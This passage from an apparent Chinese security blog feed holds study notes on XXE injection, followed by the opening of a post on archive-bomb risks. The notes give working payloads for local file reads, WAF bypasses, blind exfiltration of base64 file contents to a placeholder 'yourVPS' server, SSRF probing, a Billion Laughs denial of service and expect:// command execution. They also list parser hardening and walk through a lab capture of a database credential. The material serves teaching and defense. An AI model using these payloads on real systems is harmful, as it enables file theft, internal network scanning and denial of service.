class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--  XML部分   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD 解释：</p>
<ul>
<li>!DOCTYPE note (第二行)定义此文档是 note 类型的文档</li>
<li>!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”</li>
<li>!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型</li>
<li>!ELEMENT from (第五行)定义 from 元素为 “#PCDATA” 类型</li>
<li>!ELEMENT heading (第六行)定义 heading 元素为 “#PCDATA” 类型</li>
<li>!ELEMENT body (第七行)定义 body 元素为 “#PCDATA” 类型</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt></p>
<p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成</p>
<ul>
<li><p>元素</p>
<ul>
<li>元素是 XML 以及 HTML 文档的主要构建模块</li>
<li>HTML 元素的例子是 “body” 和 “table”</li>
<li>XML 元素的例子是 “note” 和 “message” </li>
<li>元素可包含文本、其他元素或者是空的</li>
<li>空的HTML 元素的如 “hr”、”br” 以及 “img”</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// eg</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>属性</p>
<ul>
<li>属性总是被置于某元素的开始标签中,总是以名称/值的形式成对出现的(可提供有关元素的额外信息)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg：&quot;img&quot; 元素拥有关于源文件的额外信息</span><br><span class="line">&lt;img src&#x3D;&quot;computer.gif&quot; &#x2F;&gt;</span><br><span class="line">元素的名称是 &quot;img&quot;。属性的名称是 &quot;src&quot;。属性的值是 &quot;computer.gif&quot;</span><br><span class="line">由于元素本身为空，它被一个 &quot; &#x2F;&quot; 关闭</span><br></pre></td></tr></table></figure>
</li>
<li><p>实体</p>
<p>实体是用来定义普通文本的变量，实体引用是对实体的引用，当文档被 XML 解析器解析时，实体就会被展开</p>
<ul>
<li><p>字符实体</p>
<p><code>用十进制格式(&amp;#aaa;)或十六进制格式(&amp;#xaaa;)来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同</code></p>
</li>
<li><p>命名实体</p>
<p><code>在 DTD 或内部子集（即文档中 &lt;!DOCTYPE&gt; 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。</code></p>
<p><code>&lt;!ENTITY c &quot;Chris&quot;&gt;</code><br><code>&lt;!ENTITY ch &quot;&amp;c; Herborth&quot;&gt;</code><br><code>在一个文档中使用 &amp;c; 将扩展为 Chris，&amp;ch; 将扩展为完整的 Chris Herborth</code></p>
</li>
<li><p>外部实体</p>
<p><code>外部实体表示外部文件的内容，用 SYSTEM 关键词表示。</code><br><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code><br>`&lt;!DOCTYPE Anything [</p>
<!ENTITY entityex SYSTEM "file:///etc/passwd"><p><code></code>]&gt;`</p>
<p><code>&lt;abc&gt;&amp;entityex;&lt;/abc&gt;</code><br><code>XML外部实体 entityex被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体entityex的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字SYSTEM会告诉XML解析器，entityex实体的值将从其后的URI中读取，并把读取的内容替换entityex出现的地方</code></p>
</li>
<li><p>参数实体</p>
<p><code>参数实体只用于 DTD 和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体. 参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“％”字符（或十六进制编码的％）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容</code></p>
<p><code>如下面实例，参数实体 在DOCTYPE内 ，其他实体在外</code><br>`&lt;!DOCTYPE a [</p>
<!ENTITY % name SYSTEM “file:///etc/passwd"><p><code></code>%name;<code></code>]&gt;<code></code>参数实体在DTD中解析优先级高于xml内部实体，实体相当于变量 “file:///etc/passwd”赋值给name`</p>
</li>
<li><p>内部实体</p>
<p><code>内部实体为预留的实体</code></p>
</li>
</ul>
</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt></p>
<ul>
<li><p>PCDATA</p>
<p><code>PCDATA 的意思是被解析的字符数据（parsed character data）</code><br><code>注意：被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;amp;、&amp;lt; 以及 &amp;gt; 实体来分别替换它们</code></p>
</li>
<li><p>CDATA</p>
<p><code>CDATA 的意思是字符数据（character data）</code><br><code>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</code></p>
</li>
</ul>
<hr>
<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用</p>
<ul>
<li><p>一般实体的声明语法:<code>&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</code>  引用实体的方式：&amp;实体名</p>
</li>
<li><p>数实体只能在DTD中使用，参数实体的声明格式：<code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code>引用实体的方式：%实体名</p>
</li>
<li><p>内部实体声明：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">"Bill Gates"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">"Copyright W3School.com.cn"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>外部实体声明:<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://www.test.com.cn/dtd/entities.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://www.test.com.cn/dtd/entities.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<hr>
<p>XML常见协议支持</p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt></p>
<ul>
<li>备注：.NET 即 ASP.NET</li>
</ul>
<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>​    XXE注入，即XML External Entity，XML外部实体注入。在2017 OWASP TOP 10中排名第四（<a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017RC2.pdf）。攻击者可以通过" target="_blank" rel="noopener">http://www.owasp.org.cn/owasp-project/OWASPTop102017RC2.pdf）。攻击者可以通过</a> XML 实体传递自己构造的恶意值，使XML解析器解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网信息、拒绝服务等危害</p>
<h3 id="整体分类"><a href="#整体分类" class="headerlink" title="整体分类"></a>整体分类</h3><ul>
<li>基于回显的XXE：注入— 外部实体注入本地DTD</li>
<li>基于盲注的XXE：注入—XML解析器在响应中不显示任何错误</li>
<li>基于错误的XXE：注入—成功解析之后，XML解析器始终显示SAME响应(即””您的消息已被接收”)，因此，我们可能希望解析器将文件的内容“打印”到错误响应中</li>
</ul>
<h3 id="基于回显的XXE"><a href="#基于回显的XXE" class="headerlink" title="基于回显的XXE"></a>基于回显的XXE</h3><p>​    服务能接收并解析 XML 格式的输入并且有回显的时候，输入自定义的 XML 代码，通过引用外部实体的方法，可以引用服务器上面的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>php://input</code>是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据</li>
</ul>
<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/phpStudy/1.txt"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.png" alt></p>
<h4 id="一点绕过技巧"><a href="#一点绕过技巧" class="headerlink" title="一点绕过技巧"></a>一点绕过技巧</h4><ul>
<li>如果使用<code>&lt;!ENTITY test SYSTEM</code>调用实体被WAF拦截，可以将SYSTEM替换为PUBLIC：<code>&lt;!ENTITY xxe PUBLIC &quot;aaa&quot; &quot;file:///c:/windows/win.ini&quot;&gt;</code> ,需要注意的是，PUBLIC关键词后面需要多加一个字符串</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"test"</span> <span class="meta-string">"file:///c:/phpStudy/1.txt"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5.png" alt></p>
<ul>
<li>如果WAF拦截了<code>&lt;!ENTITY</code>，无法申明实体的情况下，可以调用外部DTD文档，在外部DTD文档中申明实体</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http:&#x2F;&#x2F;VPS地址&#x2F;file.dtd&quot;&gt;</span><br><span class="line">&lt;creds&gt;&amp;file;&lt;&#x2F;creds&gt;</span><br><span class="line"></span><br><span class="line">file.dtd中的内容为：</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6.png" alt></p>
<h3 id="基于盲注的XXE-Blind-XXE"><a href="#基于盲注的XXE-Blind-XXE" class="headerlink" title="基于盲注的XXE(Blind XXE)"></a>基于盲注的XXE(Blind XXE)</h3><p>​    目标服务器没有回显,原理就是带着获取的文件源码以 get 参数或其他形式去访问攻击者的服务器，然后在日志里就可以找到要获取的内容(<strong>炮台</strong>)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 用一个外部DTD文档。指向个人VPS，尝试进行文件读取 test.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;yourVPS:port&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br><span class="line"></span><br><span class="line">2 发送请求</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE user SYSTEM &quot;http:&#x2F;&#x2F;yourVPS&#x2F;test.dtd&quot;&gt;</span><br><span class="line">&lt;user&gt;&amp;send;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8.png" alt></p>
<h3 id="基于错误的XXE"><a href="#基于错误的XXE" class="headerlink" title="基于错误的XXE"></a><del>基于错误的XXE</del></h3><p>​    <del>通过多重实体调用，使服务器产生<code>xml schema validation</code>或<code>DTD structure</code>错误，由于服务器存在报错输出，使用基于报错的xxe</del></p>
<p><del>payload</del></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/win.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; b "</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">            &lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;'</span>&gt;</span></span></span><br><span class="line"><span class="meta">%a;</span></span><br><span class="line"><span class="meta">%b;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><h3 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h3><ul>
<li>利用条件：服务器具有读文件权限，对于部分系统文件，需要有管理员权限</li>
<li>利用方法：利用服务器支持的协议读取服务器任意文件，支持的协议如下</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/9.png" alt></p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><ul>
<li>利用条件：服务器与内网网络互通</li>
<li>利用方法：借助服务器支持的协议如http，XXE可以协助扫描内网,探测存活主机、端口指纹和开放的服务</li>
</ul>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:3389"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.png" alt></p>
<ul>
<li>如果WAF拦截了http(s)://127.0.0.1和http(s)://localhost的访问，可以借助xip.io这个公用DNS解析服务，对于任何*.ip.xip.io的地址，都会被解析到IP这个地址，例如访问<a href="http://balabala.127.0.0.1.xip.io，最终会解析为http://127.0.0.1" target="_blank" rel="noopener">http://balabala.127.0.0.1.xip.io，最终会解析为http://127.0.0.1</a></li>
</ul>
<h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>​    在POC中先定义了lol实体，值为”lol”的字符串,后在下面又定义了lol2实体，lol2实体引用10个lol实体，lol3又引用了10个lol2实体的值，依此类推，到了最后在lolz元素中引用的lol9中，就会存在上亿个”lol”字符串</p>
<ul>
<li>此时解析数据时未做特别处理，即可能造成拒绝服务攻击</li>
<li>最典型的案例是Billion Laughs 攻击，xml解析的时候，<code>&lt;lolz&gt;&lt;/lolz&gt;</code>中间将是一个十亿级别大小的参数，将会消耗掉系统30亿字节的内存</li>
</ul>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">"lol"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul>
<li>利用条件：服务器安装了expect扩展（该扩展已停止更新，适用于PHP5）,该扩展只存在于Linux系统中</li>
<li>利用方法：expect://command</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://命令(eg id)"</span> &gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ul>
<li>使用语言中推荐的禁用外部实体的方法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);</span><br><span class="line">.setFeature("http://xml.org/sax/features/external-general-entities",false)</span><br><span class="line">.setFeature("http://xml.org/sax/features/external-parameter-entities",false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<ul>
<li>手动黑名单过滤(不推荐)</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE、&lt;!ENTITY <span class="meta-keyword">SYSTEM</span>、PUBLIC</span></span><br></pre></td></tr></table></figure>


<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><ul>
<li>靶场主页</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/11.png" alt></p>
<ul>
<li>已知有漏洞的页面</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/12.png" alt></p>
<ul>
<li>修改数据包如下，发送恶意构造的XML</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/13.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/14.png" alt></p>
<ul>
<li>查看炮台，拿到base64编码，界面获取数据库密码<code>$conn = mysqli_connect(&quot;192.168.0.10&quot;,&quot;xxe&quot;, &quot;teiwo!8#7ERe1DPC&quot;, &quot;scms&quot;);</code></li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/15.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/16.png" alt></p>
<ul>
<li>登录在线数据库后台(两种数据库在线管理phpmyadmin+/adminer.php)</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/17.png" alt></p>
<ul>
<li>获取管理员密码MD5</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/18.png" alt></p>
<ul>
<li>解密</li>
</ul>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/19.png" alt></p>
<h3 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h3><p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/21.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/22.png" alt></p>
<h3 id="第三个"><a href="#第三个" class="headerlink" title="第三个"></a>第三个</h3><p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/23.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/24.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/25.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/26.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/27.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/28.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/29.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/30.png" alt></p>
<p><img data-src="./XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/31.png" alt></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩包安全浅析</title>
    <url>/2021/01/09/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="压缩包安全浅析"><a href="#压缩包安全浅析" class="headerlink" title="压缩包安全浅析"></a>压缩包安全浅析</h1><p>​    日常后端开发过程中，经常会遇到需要用户上传压缩包的场景，这个时候如果对压缩包处理不当，会造成一定的安全风险。主要分为:</p>
<ul>
<li>炸弹问题</li>
<li>目录穿越问题</li>
</ul>
<a id="more"></a>

<h2 id="压缩包炸弹"><a href="#压缩包炸弹" class="headerlink" title="压缩包炸弹"></a>压缩包炸弹</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>​    一个很小很小的经过压缩后的文件，解压后能达到几百万GB，大量消耗磁盘，造成服务器CPU、内存、磁盘压力暴增，DOS攻击</p>
<h3 id="压缩说起"><a href="#压缩说起" class="headerlink" title="压缩说起"></a>压缩说起</h3><p>​    顾名思义，压缩的概念就是将文件占有的空间缩小，而缩小的方法可以分为两种</p>
<ul>
<li><p>有损压缩</p>
